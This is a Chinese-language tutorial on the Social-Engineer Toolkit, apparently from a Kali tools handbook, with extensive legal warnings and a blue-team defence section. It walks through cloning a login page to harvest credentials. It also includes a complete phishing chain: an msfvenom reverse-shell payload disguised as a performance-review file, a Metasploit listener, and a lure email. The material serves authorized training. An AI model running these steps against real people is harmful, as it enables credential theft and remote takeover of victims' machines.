# SET（Social-Engineer Toolkit，社工攻击工具包）

> **一句话**：把「克隆一个登录页 → 骗目标输入口令 → 记录凭据/投递载荷」这套社工流程做成交互式菜单——**几百个安全意识的教训，压缩成 3 次回车**。
> **分类**：社会工程 / 初始访问 ｜ **Kali 包**：`set`（命令 **`setoolkit`**；`se-toolkit` 已被 Kali 标记为废弃）｜ **官方文档**：<https://github.com/trustedsec/social-engineer-toolkit> ｜ 官网：<https://www.trustedsec.com/>

---

## 1. 它解决什么问题

社工攻击在技术上并不复杂，但**工程细节很多**：搭个 Web 服务、克隆目标登录页、处理表单提交、记录凭据、生成载荷、起监听、发邮件……手工串起来容易出错。

SET 把这些流程固化成菜单：

| 你想做的事 | SET 里点几下 |
|------------|--------------|
| **克隆一个登录页并收集凭据** | `1) Social-Engineering Attacks` → `2) Website Attack Vectors` → `3) Credential Harvester` → `2) Site Cloner` |
| 用模板页（Google/Twitter 等）收集凭据 | 同上，选 `1) Web Templates` |
| 生成恶意的 Office/PDF 并邮件投递 | `1) Spear-Phishing Attack Vectors` |
| 生成"带毒"U 盘（HID 伪装/自动执行） | `3) Infectious Media Generator` |
| 快速起 Payload + 监听 | `4) Create a Payload and Listener` |
| 群发钓鱼邮件 | `5) Mass Mailer Attack` |
| PowerShell 攻击向量 | `9) Powershell Attack Vectors` |

对比同类：

| 工具 | 定位 | 差异 |
|------|------|------|
| **SET** | **交互式社工全家桶** | 覆盖面广（钓鱼/Web/介质/短信/无线）；菜单式、自动化程度高 |
| **`gophish`** | **钓鱼演练平台** | 面向企业**安全意识培训**：有"目标组/模板/时间线/统计报表/API"，可重复、可度量；见 [`gophish.md`](gophish.md) |
| **`beef-xss`** | 浏览器后利用 | 利用**已有 XSS**（客户端侧）；见 [`../06-漏洞利用/beef-xss.md`](../06-漏洞利用/beef-xss.md) |
| **Metasploit** | 漏洞利用框架 | SET 在需要载荷时会调用它；见 [`../06-漏洞利用/metasploit-framework.md`](../06-漏洞利用/metasploit-framework.md) |
| **`msfvenom`/`dnstwist`** | 载荷/仿冒域名 | 常与 SET 配合；见 [`../06-漏洞利用/msfvenom.md`](../06-漏洞利用/msfvenom.md) |

**一句话选型**：**一次性、交互式、演示/CTF** → SET；**企业年度钓鱼演练、要统计与合规记录** → Gophish。

---

## 2. 工作原理

```
setoolkit（Python 程序，菜单驱动）
   │
   ├─ 读取配置 /etc/setoolkit/set.config
   │    · APACHE_SERVER=ON          → 启动本地 Apache 托管钓鱼页
   │    · WEBATTACK_EMAIL=OFF       → 是否同时发邮件
   │    · METASPLOIT_PATH=...       → 调用 msf 生成/监听载荷
   │    · HARVESTER_LOG=...         → 凭据日志位置
   │
   ├─ Web 攻击向量（Credential Harvester）
   │    ├─ 克隆目标登录页（抓取 HTML/CSS/JS 到本地）
   │    ├─ 改写表单 action → 指向本地收集脚本（POST 处理）
   │    ├─ 起 Apache + PHP（Python 收集脚本写成网页）
   │    └─ 目标提交后：记录 POST 数据（明文凭据）→ 跳转真实站点（降低怀疑）
   │
   ├─ 邮件攻击向量（Spear-Phishing / Mass Mailer）
   │    ├─ 输入 SMTP（或直连目标 MX）
   │    └─ 附件由 msfvenom/自定义模版生成
   │
   ├─ 介质攻击向量（Infectious Media）
   │    └─ 生成 autorun.inf + payload（或 HID 键盘伪装）
   │
   └─ 输出
        ├─ 凭据日志（reports 目录）
        ├─ 生成的载荷文件
        └─ 屏幕上的实时回显（harvest 时会打印提交的字段）
```

**关键机制与限制**：

- **Apache + PHP**：凭据收集依赖 Web 服务。SET 会检查/启动 Apache（`service apache2 status`）。**端口冲突是头号报错来源**。
- **站点克隆的缺点（必须知道）**：克隆的是**静态快照**——现代站点大量使用 JS 框架与登录后跳转，克隆页往往**看起来像但用起来不对**；此外浏览器地址栏显示的仍是**你的域名/IP**（除非配合域名仿冒，这里可以用 Kali 清单里的 `dnstwist` 做仿冒域名研究）。
- **现代防护的存在**：邮件网关、URL 重写、MFA、条件访问、浏览器反钓鱼、凭据检查——**这些会让 SET 的传统手法大面积失效**。这恰恰是它作为"检测能力试金石"的价值。
- **日志与痕迹**：SET 的活动会在**你自己的机器**（Apache 日志）和**目标侧**（邮件网关、DNS、代理、EDR）留下痕迹。**授权测试必须事先与蓝队对齐。**

---

## 3. 安装与快速上手

```bash
sudo apt update
sudo apt install set
command -v setoolkit    # Kali 提供 setoolkit；se-toolkit 已废弃
```

```bash
sudo setoolkit
```

```console
 Select from the menu:

   1) Social-Engineering Attacks
   2) Penetration Testing (Fast-Track)
   3) Third Party Modules
   4) Update the Social-Engineer Toolkit
   5) Update SET configuration
   6) Help, Credits, and About

  99) Exit the Social-Engineer Toolkit

set> 
```

> **首次运行会要求同意 ToS**（输入 `y`）。Kali 打包版本还会自动生成 `set.config.py`（"New set.config.py file generated"）。

配置（改之前先备份）：

```bash
sudo cp /etc/setoolkit/set.config /etc/setoolkit/set.config.bak
sudo grep -vE '^\s*#|^\s*$' /etc/setoolkit/set.config | head -20
```

```console
APACHE_SERVER=ON
APACHE_DIRECTORY=/var/www/html
WEBATTACK_EMAIL=OFF
METASPLOIT_PATH=/usr/share/metasploit-framework
...
```

**前提检查**（缺一个就会卡住）：

```bash
# 1) Apache 可用且端口空闲
sudo systemctl status apache2 --no-pager | head -5
sudo ss -lntp | grep -E ':80|:443' || echo "80/443 空闲"

# 2) msf 可用（生成载荷/监听时用）
command -v msfvenom msfconsole

# 3) 目录权限（SET 需要往 /var/www/html 写）
ls -ld /var/www/html
find /usr/share/set -maxdepth 1 -type d 2>/dev/null | head
```

---

## 4. 核心参数详解

SET 是**菜单驱动**的，没有多少命令行参数。真正的"参数"是**菜单路径 + 配置项**。

### 4.1 主菜单路径速查（**记住这几条就够用**）

| 目的 | 菜单路径 |
|------|----------|
| **克隆站点收集凭据** | `1) Social-Engineering Attacks` → `2) Website Attack Vectors` → `3) Credential Harvester Attack Method` → `2) Site Cloner` |
| 用内置模板收凭据 | `... → 3) Credential Harvester Attack Method → 1) Web Templates` |
| 自定义导入页面 | `... → 3) Credential Harvester → 3) Custom Import`（把自研页面放进 SET 的模板目录） |
| 用 Metasploit 浏览器漏洞 | `1) → 2) → 2) Metasploit Browser Exploit Method` |
| Java Applet（历史手法） | `1) → 2) → 1) Java Applet Attack Method` |
| Tabnabbing / Web Jacking | `1) → 2) → 4) / 5)` |
| HTA 攻击（Windows 常用） | `1) → 2) → 8) HTA Attack Method` |
| **钓鱼邮件（带附件）** | `1) → 1) Spear-Phishing Attack Vectors` |
| 群发邮件 | `1) → 5) Mass Mailer Attack` |
| 生成"带毒"U 盘/光盘 | `1) → 3) Infectious Media Generator` |
| Payload + 监听一条龙 | `1) → 4) Create a Payload and Listener` |
| **克隆网页后同时发邮件** | 主菜单 → `5) Update SET configuration` → 设 `WEBATTACK_EMAIL=ON` |
| PowerShell 攻击向量 | `1) → 9) Powershell Attack Vectors` |
| 二维码攻击向量 | `1) → 8) QRCode Generator Attack Vector` |
| 短信伪造（需第三方网关） | `1) → 11) SMS Spoofing Attack Vector` |

### 4.2 `set.config` 关键配置项

| 配置项 | 作用 | 使用建议 |
|--------|------|----------|
| `APACHE_SERVER` | 是否启动本地 Apache | 通常 `ON`（凭据收集需要） |
| `APACHE_DIRECTORY` | Apache 站点根目录 | 默认 `/var/www/html` |
| `WEBATTACK_EMAIL` | Web 攻击时是否同时发邮件 | 设 `ON` 可做"点击即收凭据 + 邮件提醒" |
| `METASPLOIT_PATH` | Metasploit 安装路径 | Kali 默认 `/usr/share/metasploit-framework` |
| `SELF_SIGNED_APP` / `SSL` 相关 | 是否启用 HTTPS | 现代演练**建议用真实证书**（否则浏览器警告会暴露） |
| `HARVESTER_LOG` | 凭据日志位置 | 找日志时先查它 |
| `MASS_MAILER_*` | 群发邮件默认参数 | 视演练环境配置 |
| `JAVA_REPEATER` / `JAVA_*` | Java 相关能力（历史手法） | 现代基本无效 |
| `AUTO_DETECT` 相关 | 自动探测本机 IP 等 | 多网卡环境建议手工确认 IP |

### 4.3 交互过程中的常见提问（**心里要有答案**）

| SET 问什么 | 你该填什么 |
|------------|------------|
| `IP address for the POST back in Harvester/Tabnabbing` | **攻击机可达的 IP**（目标能访问到的那个；不是 127.0.0.1） |
| `Port: 80 or 443` | 有真实证书用 443；靶场内部用 80 |
| `Enter the url to clone:` | `https://<靶站>/login`（**仅克隆你有授权的站点**） |
| `We can use a self-signed certificate...` | 授权演练：接受；真实场景：必须用可信证书 |
| `Do you want to disable the payload on the site here?` | 视场景（想纯收凭据就禁用载荷） |
| `Press [enter] to continue` | 表示服务已起，去受害机测试 |

---

## 5. 实战演练

> **环境声明（本节最重要的一段）**：
> 以下演练**只能**在以下环境进行：
> 1. **专门搭建的演练环境**：你自建的靶站（DVWA / 自建登录页）+ **你自己拥有的测试账号** + **明确知情的参与者**（安全意识演练需事先获得组织批准并告知参与者，或在制度中明确"可能进行钓鱼演练"）；
> 2. **CTF 竞赛**中明确允许的社工环节；
> 3. **书面授权的红队/渗透测试**，且授权书**明确覆盖"钓鱼与凭据收集"**（很多授权书默认不包含）。
>
> **绝对禁止**：对真实用户、真实企业邮箱、互联网上的任意站点进行站点克隆或凭据收集。这属于**非法侵入计算机信息系统与侵犯公民个人信息**，详见文末。

### 场景 1：搭建一个"内部演练"环境（先造靶子，再学工具）

**Step 1：在靶机上做一个登录页（自建，作为被克隆对象）**

```bash
# 在靶机（192.168.56.102）上，用 Docker 起一个带登录页的靶站
docker run -d --name corp-portal -p 8080:80 vulnerables/web-dvwa
```

```bash
# 或者自己写一个最小的登录页
sudo mkdir -p /var/www/html/portal && sudo tee /var/www/html/portal/index.html > /dev/null <<'HTML'
<!doctype html><html><head><title>员工门户 - 登录</title></head><body>
<h2>员工门户</h2>
<form method="POST" action="/portal/login.php">
  用户名：<input name="username"><br>
  口令：<input type="password" name="password"><br>
  <button type="submit">登录</button>
</form>
</body></html>
HTML
```

**Step 2：确认攻击机与靶机互通、攻击机 80 端口空闲**

```bash
ip -4 addr show | grep -E 'inet ' | grep -v 127.0.0.1
ping -c 2 192.168.56.102
sudo ss -lntp | grep ':80 ' || echo "80 空闲"
```

**至此你有了一个合法的、自建的、可以用来练习克隆的目标。**

### 场景 2：Credential Harvester + Site Cloner（经典流程）

```bash
sudo setoolkit
```

```console
set> 1
   1) Spear-Phishing Attack Vectors
   2) Website Attack Vectors
   ...
set:webattack> 2
   1) Java Applet Attack Method
   2) Metasploit Browser Exploit Method
   3) Credential Harvester Attack Method
   ...
set:webattack> 3
   1) Web Templates
   2) Site Cloner
   3) Custom Import
set:webattack> 2
[-] Credential harvester will allow you to utilize the clone capabilities within SET
[-] to harvest credentials or parameters from a website as well as place them into a report

set:webattack> IP address for the POST back in Harvester/Tabnabbing: 192.168.56.5
[-] SET supports both HTTP and HTTPS
[-] Example: http://192.168.56.102:8080/portal/
set:webattack> Enter the url to clone: http://192.168.56.102:8080/portal/

[*] Cloning the website: http://192.168.56.102:8080/portal/
[*] This could take a little bit...
[*] Harvester is ready. Waiting for credentials...
```

**解读**：

- `POST back` 填的是**攻击机 IP**（`192.168.56.5`）——因为目标浏览器提交表单时是连攻击机的 80 端口；
- 克隆完成后 SET 会起 Apache 并等待提交；
- **此时访问攻击机的 80 端口，应该能看到克隆出来的登录页**。

```bash
# 验证克隆页是否可访问（在攻击机上）
curl -s http://127.0.0.1:80/ | head -20
```

**受害者侧**（用你的测试浏览器/虚拟机访问）：

```
http://192.168.56.5/
```

在克隆页输入测试账号（例如演练用的 `alice / labpass123`）并提交。

**攻击机侧实时输出**：

```console
[*] WE GOT A HIT! Printing the output:
PARAM: username=alice
PARAM: password=labpass123
[*] File saved to: /usr/share/set/reports/<timestamp>_<ip>.txt
```

**解读 → 三件事同时发生了**：

1. **凭据被记录**（`PARAM:` 行）；2. **写入报告文件**（`reports/` 目录）；3. **目标被重定向到真实站点**（降低怀疑）。

```bash
# 找到凭据日志（Kali 打包路径以实际为准，用 find 定位）
sudo find / -name '*.txt' -path '*reports*' -mmin -10 2>/dev/null | head
sudo cat "$(sudo find / -name '*.txt' -path '*reports*' -mmin -10 2>/dev/null | head -1)"
```

**⚠️ 如果这是真实客户环境**：**立刻停止**。你刚刚收集了真实凭据——这必须事先获得**明确书面授权**，并按约定流程上报与销毁。

### 场景 3：钓鱼邮件 + 载荷投递（完整社工链）

**Step 1：先生成载荷**（见 [`../06-漏洞利用/msfvenom.md`](../06-漏洞利用/msfvenom.md)）

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.56.5 LPORT=4444 \
         -f exe -o /tmp/lab/2024-Q4_绩效考核表.exe
```

**Step 2：起监听**

```console
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 192.168.56.5
msf6 exploit(multi/handler) > set LPORT 4444
msf6 exploit(multi/handler) > set ExitOnSession false
msf6 exploit(multi/handler) > run -j
```

**Step 3：用 SET 的钓鱼邮件向量**

```bash
sudo setoolkit
```

```console
set> 1
set:webattack> 1        ← Spear-Phishing Attack Vectors
   1) Perform a Mass Email Attack
   2) Create a FileFormat Payload
   3) Create a Social-Engineering Template
set:phishing> 1
   ...
   Enter the FROM address: security-awareness@lab.local      ← 必须是演练环境的自有域
   Enter the TO address:  tester@lab.local                    ← 只能是知情参与者
   Enter the subject:  【重要】2024 Q4 绩效考核表（请于今日核对）
   Enter the body: ...
```

**解读**：SET 会把"看起来像业务文件"的名字 + 恶意载荷组合起来。**邮箱名与内容要符合演练口径**（例如统一加 `[演练]` 标记，或在演练结束立即发澄清邮件）。

**真人演练的纪律（必须做到）**：

| 要求 | 原因 |
|------|------|
| **只发给知情参与者或已批准的演练名单** | 法律与合规底线 |
| **邮件内容标明演练性质**（或演练后立即澄清） | 避免引发真实恐慌 |
| **不使用真实业务敏感标题**（如"裁员名单"） | 会造成不必要的心理冲击与劳动争议 |
| **记录发送名单与时间** | 用于统计与向管理层汇报 |
| **演练结束清理所有载荷与凭据** | 防误用 |

### 场景 4：SET 与 Gophish 的分工（**什么时候不该用 SET**）

| 需求 | 用 SET | 用 Gophish |
|------|--------|------------|
| 一次性演示"钓鱼长什么样" | ✅ 快 | 也可以，但配置更多 |
| 企业年度演练、要**统计点击率/提交率** | ❌ 统计能力弱 | ✅ 有完整报表 |
| 要**分批发送、控制节奏** | ❌ 手工 | ✅ 时间线/分组 |
| 要**留存合规记录**（发了谁、谁点了） | ❌ 靠手工记 | ✅ 内置 |
| 要**生成恶意载荷**并配合 msf | ✅ 强 | ❌ 不做载荷 |
| 要**克隆站点收凭据** | ✅ 强 | ✅ Landing Page 也可（需自己准备页面） |
| 要**API 集成进自动化** | ❌ | ✅ 完整 REST API |

**结论**：**SET 适合"单点社工手法"的快速验证与教学；Gophish 适合"组织级安全意识演练"。** 见 [`gophish.md`](gophish.md)。

---

## 6. 输出解读

| 输出 | 含义 | 下一步 |
|------|------|--------|
| `Cloning the website: <url>` | 开始抓取目标页面 | 等它完成 |
| `Harvester is ready. Waiting for credentials...` | 服务已起，等待提交 | 去受害机访问验证 |
| `WE GOT A HIT!` | **有人提交了表单** | 看下面的 `PARAM:` |
| `PARAM: username=...` / `PARAM: password=...` | **记录了提交字段**（明文） | 演练中统计；**报告必须脱敏** |
| `File saved to: .../reports/...txt` | 凭据日志落盘 | 记录路径便于清理 |
| `[*] Attempting to find the external IP` | 自动探测 IP | **多网卡时务必手工确认**（否则 POST 回来会失败） |
| `Error: Apache service is not running` | Apache 没起/端口占用 | `sudo systemctl start apache2`；`ss -lntp \| grep :80` |
| `Please enter a valid IP address` | IP 填错（如填了域名或 127.0.0.1） | 填**目标可达的攻击机 IP** |
| 克隆页样式全乱 | 站点是 JS 渲染/需要认证/CSS 是绝对路径 | 换 `Custom Import`（手工做页面）或用 Gophish 自己准备 Landing Page |
| 目标提交后没有回显 | POST 没到（IP/端口/防火墙） | 抓包确认：`sudo tcpdump -i any -A port 80` |
| 载荷生成失败 | `METASPLOIT_PATH` 配错 / msf 未装 | 改 `/etc/setoolkit/set.config`；`command -v msfvenom` |
| 邮件发送失败 | SMTP 配置/被网关拦 | 这通常说明**防御生效**；换自有 SMTP（演练环境） |

---

## 7. 与其他工具配合

```
① 侦察与目标选择
   dnstwist（仿冒域名） / OSINT（员工邮箱、组织架构）  →  ../01-信息搜集/（如已收录）
        │
② 诱饵与页面
   ├─ SET：克隆站点、模板页、二维码、短信           ← 本文
   ├─ gophish：组织级钓鱼演练（模板/分组/报表/API）   ← gophish.md
   └─ beef-xss：利用已有 XSS 做客户端后利用          ← ../06-漏洞利用/beef-xss.md
        │
③ 载荷
   msfvenom（生成 exe/elf/hta/宏）                  ← ../06-漏洞利用/msfvenom.md
   powershell-empire（无文件 PS 载荷）              ← ../08-后渗透/powershell-empire.md
        │
④ 收口
   msf multi/handler / sliver（C2）                 ← ../06-漏洞利用/metasploit-framework.md、../12-基础设施与C2/sliver.md
        │
⑤ 拿到凭据之后
   netexec / impacket / evil-winrm                  ← ../08-后渗透/
⑥ 报告与记录
   cherrytree / dradis                              ← cherrytree.md、dradis.md
```

- 钓鱼演练平台：[`gophish.md`](gophish.md) ｜ 记录与报告：[`cherrytree.md`](cherrytree.md)、[`dradis.md`](dradis.md)
- 载荷与 C2：[`../06-漏洞利用/msfvenom.md`](../06-漏洞利用/msfvenom.md)、[`../12-基础设施与C2/sliver.md`](../12-基础设施与C2/sliver.md)
- 客户端侧后利用：[`../06-漏洞利用/beef-xss.md`](../06-漏洞利用/beef-xss.md)

---

## 8. 常见坑与排错

| 报错/现象 | 原因 | 解决 |
|-----------|------|------|
| `se-toolkit` 提示已废弃 | Kali 改用 `setoolkit` | 用 `sudo setoolkit` |
| `Apache service is not running` | Apache 未启动 | `sudo systemctl start apache2`；或 `5) Update SET configuration` 里确认 `APACHE_SERVER=ON` |
| 端口 80 被占用 | 其他 Web 服务在跑 | `sudo ss -lntp \| grep :80`；停掉冲突服务 |
| 首次运行卡在 ToS | 需输入 `y` | 同意即可（仅一次） |
| 克隆页显示正常但提交无反应 | **POST back IP 填错**（最常见） | 填目标可达的攻击机 IP；`tcpdump` 验证请求是否到达 |
| 克隆页样式丢失 | 站点用 JS 渲染/绝对路径/CSS 需登录 | 用 `Custom Import` 自建页面，或改用 Gophish 的 Landing Page |
| 目标浏览器报证书错误 | 自签证书 | 真实演练**必须用可信证书**；否则等于自我暴露 |
| 生成的载荷被杀软秒删 | 特征命中（正常现象） | 说明防护有效；授权演练中记录该结果 |
| 邮件被网关拦 | SPF/DKIM/DMARC/URL 重写/附件沙箱 | **这正是演练要验证的防御能力**；换自有演练域名并配好 SPF/DKIM |
| 找不到凭据日志 | 路径随打包方式不同 | `sudo find / -path '*reports*' -name '*.txt' -mmin -60` |
| 多网卡导致 POST 失败 | 自动探测到了错误网卡 | 手工填正确 IP；或先 `ip route` 确认出口 |
| 大文件克隆超时 | 目标站点很大/很慢 | 用 `Custom Import` 只做需要的登录页 |

---

## 9. 防御视角（蓝队）

**SET 是蓝队最重要的"检验工具"之一**：它能用真实手法测试「员工 + 邮件网关 + 浏览器 + EDR」这条链的防护有效性。

| 攻击手法 | 检测信号 | 缓解措施 |
|----------|----------|----------|
| **克隆登录页** | 新注册/新出现的域名；页面与真实登录页高度相似（**视觉相似度检测**）；URL 与品牌不匹配 | 品牌保护/域名监控（`dnstwist` 自检）、DMARC 强制、邮件网关 URL 重写、浏览器侧反钓鱼（Safe Browsing） |
| 钓鱼邮件 | SPF/DKIM/DMARC 失败、发件域新注册、附件类型异常（`.exe`/`.hta`/宏文档）、正文含紧迫性话术 | **DMARC `p=reject`**、附件沙箱、URL 重写与点击时检测、外部发件人标记（External Tag） |
| 凭据提交 | **不可能旅行**（异地登录）、新设备/新 UA、登录后立刻用凭据做其他访问 | **MFA / 条件访问**（**这是最有效的一招**）、异常登录检测、凭据泄露监控 |
| 附件载荷 | 邮件附件沙箱告警、Office 宏执行告警、`mshta`/`rundll32` 异常子进程 | 宏默认禁用、ASR 规则、WDAC/AppLocker、EDR |
| 二维码钓鱼（Quishing） | 邮件里的二维码指向非白名单域名 | 邮件网关 QR 解码与检测、用户培训 |
| 短信/电话钓鱼 | 员工上报 | MFA（短信 MFA 本身也是钓鱼目标→用 FIDO2/Passkey） |
| **员工上报行为** | —— | 建立**一键上报按钮**，并奖励上报者（**比惩罚点击者有效得多**） |

**蓝队落地清单**：

1. **强制 MFA + 条件访问**：即便凭据被钓走，也无法直接用——**这是 ROI 最高的一条**；
2. **DMARC/SPF/DKIM 全部配好并设为 `p=reject`**：直接挡掉大部分伪造发件域；
3. **定期用 SET/Gophish 做演练**，**统计点击率与上报率**（上报率比点击率更能说明防护成熟度）；
4. **建立上报通道 + 培训**：演练后**对上报者给予肯定**，对点击者提供"事后教育"而非惩罚；
5. **用 `dnstwist` 自检仿冒域名**（Kali 工具清单里就有），提前注册/监控近似域名；
6. **监控「不可能旅行」与异常登录**（这是凭据被使用的第一信号）。

---

## 10. 参考

- SET 官方仓库（含全部向量与配置说明）：<https://github.com/trustedsec/social-engineer-toolkit>
- TrustedSec 官网（SET 发布页）：<https://www.trustedsec.com/>
- Kali 工具页：<https://www.kali.org/tools/set/>
- 本地资源：`sudo setoolkit`（菜单内 `6) Help, Credits, and About`）、`/etc/setoolkit/set.config`
- 配套教程：[`gophish.md`](gophish.md)、[`cherrytree.md`](cherrytree.md)、[`dradis.md`](dradis.md)
- 相关标准：NIST SP 800-115《Technical Guide to Information Security Testing and Assessment》中对社会工程测试的合规要求；组织内部的**演练授权与告知制度**

## ⚠️ 法律与伦理（**本节请完整阅读**）

SET 是**所有 Kali 工具里法律风险最高的一类**——因为它直接针对**人**。

**可能触犯的法律**：

- 《刑法》**第 285 条**：非法侵入计算机信息系统罪、非法获取计算机信息系统数据罪、**非法控制计算机信息系统罪**（克隆站点收集凭据、投递载荷）；
- 《刑法》**第 253 条之一**：侵犯公民个人信息罪（**收集的账号口令属于个人信息**）；
- 《刑法》第 252 条：侵犯通信自由罪（**收发他人邮件内容**）；
- **《网络安全法》第 27 条**、**《数据安全法》**、**《个人信息保护法》**（未经同意处理个人信息）；
- 涉及国家关键信息基础设施的，风险更高。

**强制要求（缺一不可）**：

1. **书面授权必须明确覆盖"社会工程测试"** —— 很多渗透测试授权书**默认不包含钓鱼**，必须单独确认；
2. **必须获得组织批准并履行告知程序** —— 企业内部钓鱼演练需有制度依据（员工手册/信息安全政策中明确"可能进行安全演练"），并取得管理层批准；
3. **只针对知情参与者或已批准的演练名单**；
4. **不使用会造成恐慌的诱饵**（裁员、事故、工资、健康等主题）；
5. **演练结束立即清理**：删除克隆站点、载荷、凭据日志；向参与者发澄清邮件；
6. **凭据必须脱敏**：报告中**绝不粘贴真实口令**，只统计"多少人提交了凭据"；
7. **绝不用于真实攻击**：不做"顺手用一下客户的真实系统"这样的事——**这是犯罪，不是测试**。

**如果你不确定是否有授权，就不要执行。** 这是本教程唯一的"无条件"要求。
